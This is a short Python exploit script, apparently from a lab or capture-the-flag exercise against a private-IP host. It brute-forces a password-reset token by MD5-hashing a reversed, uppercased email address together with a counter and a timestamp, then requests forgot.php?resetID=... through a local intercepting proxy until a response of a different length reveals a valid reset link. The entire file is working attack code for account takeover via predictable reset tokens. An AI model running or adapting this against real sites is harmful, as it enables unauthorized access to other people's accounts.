import requests
import datetime
import hashlib

#dt = "10:37:42 16/03/2023"
#10:50:07 16/03/2023


time = str(int(datetime.datetime(2023,3,16,10,50).strftime("%s"))+7)

email = "61qwfZ@secure-chat.co.uk".upper()[::-1]



for i in range(100):
    string = email + str(i) + time
    
    h = hashlib.md5()

    h.update(string.encode("utf-8"))

    query = "http://10.102.126.68/forgot.php?resetID=" + str(h.hexdigest())
    r = requests.get(query, proxies={"http":"http://127.0.0.1:8080"})
    if len(r.text) != 3587:
        print(query)
        quit()
